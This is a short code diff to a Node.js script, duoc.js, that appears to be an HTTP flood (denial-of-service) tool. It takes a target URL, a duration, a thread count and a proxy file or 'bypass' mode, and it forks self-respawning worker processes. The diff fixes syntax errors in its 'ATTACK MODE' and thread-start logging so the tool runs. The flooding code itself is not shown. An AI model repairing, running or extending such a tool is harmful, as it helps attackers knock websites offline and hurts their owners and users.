@@ -6,7 +6,7 @@ const request = require('request'),
 
 async function main_process() {
     if (process.argv.length !== 6) {
-        console.log(Usage: node duoc.js <URL> <TIME> <THREADS> <bypass | proxy.txt>);
+        console.log(`Usage: node duoc.js <URL> <TIME> <THREADS> <bypass | proxy.txt>`);
         process.exit(0);
     }
 
@@ -30,7 +30,7 @@ async function main_process() {
     if (proxyMode === 'bypass') {
         console.log("ATTACK MODE: BYPASS (no proxy)");
     } else {
-        console.log(ATTACK MODE: HTTP_PROXY from file: ${proxyMode});
+        console.log(`ATTACK MODE: HTTP_PROXY from file: ${proxyMode}`);
         try {
             const data = fs.readFileSync(proxyMode, 'utf-8');
             proxies = data.replace(/\r/g, '').split('\n').filter(p => p.trim() !== '');
@@ -92,7 +92,7 @@ async function main_process() {
         if (cluster.isMaster) {
             for (let i = 0; i < threads; i++) {
                 cluster.fork();
-                console.log(Started thread: ${i + 1});
+                console.log(`Started thread: ${i + 1}`);
             }
             cluster.on('exit', () => {
                 cluster.fork();
